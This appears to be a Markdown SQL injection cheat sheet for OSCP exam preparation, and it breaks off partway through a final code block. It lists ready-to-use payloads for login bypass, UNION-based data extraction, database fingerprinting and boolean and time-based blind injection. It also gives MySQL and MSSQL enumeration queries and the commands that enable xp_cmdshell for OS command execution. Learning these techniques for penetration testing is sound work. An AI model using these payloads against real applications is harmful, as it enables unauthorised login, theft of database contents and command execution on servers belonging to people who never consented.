---
layout: default
title: SQL Injection Cheat Sheet
nav_order: 1
---

# SQL Injection (SQLi) Cheat Sheet

This cheat sheet focuses on manual exploitation techniques and payloads common in the OSCP labs and exam environments.

---

## 🟢 Detection & Auth Bypass
The first step is breaking the query or bypassing login forms.

| Payload | Description |
| :--- | :--- |
| `' OR 1=1--` | Basic Auth Bypass (Double Dash for MySQL/MSSQL) |
| `' OR 1=1#` | Auth Bypass (Hash for MySQL) |
| `") OR 1=1--` | Breaking out of double quotes and brackets |
| `' OR '1'='1` | Classic string-based bypass |
| `admin' --` | Log in as admin user (ignoring password) |

---

## 🔵 UNION-Based Extraction
Used when the application displays the results of the query on the page.

### 1. Find Column Count
Increment the number until you get an error or the page changes.
* `1' ORDER BY 1--`
* `1' ORDER BY 2--`
* `1' ORDER BY 3--`

### 2. Find Vulnerable Columns
Look for which number (1, 2, or 3) appears on the web page.
* `' UNION SELECT 1,2,3--`

### 3. Database Fingerprinting
* **MySQL/PostgreSQL:** `' UNION SELECT 1,version(),database()--`
* **MSSQL:** `' UNION SELECT 1,@@version,DB_NAME()--`

---

## 🟡 Blind SQL Injection
Used when the page doesn't return data, only a "True" (Success) or "False" (Error/Empty) response.

### Boolean-Based (Manual)
* `' AND 1=1--` (Page loads normally)
* `' AND 1=2--` (Page returns error/different content)
* `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`

### Time-Based (Testing Connectivity)
If the page pauses for 5 seconds, it’s vulnerable.
* **MySQL:** `' OR SLEEP(5)--`
* **MSSQL:** `'; WAITFOR DELAY '0:0:5'--`
* **PostgreSQL:** `' OR pg_sleep(5)--`

---

## 🔴 Database Specific Enumeration

### MySQL / MariaDB
* **Current User:** `SELECT USER()`
* **List Databases:** `SELECT schema_name FROM information_schema.schemata`
* **List Tables:** `SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'`
* **List Columns:** `SELECT column_name FROM information_schema.columns WHERE table_name='users'`

### MSSQL (Windows Environments)
* **Check if DBA:** `SELECT IS_SRVROLEMEMBER('sysadmin')`
* **Enable xp_cmdshell:**
  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
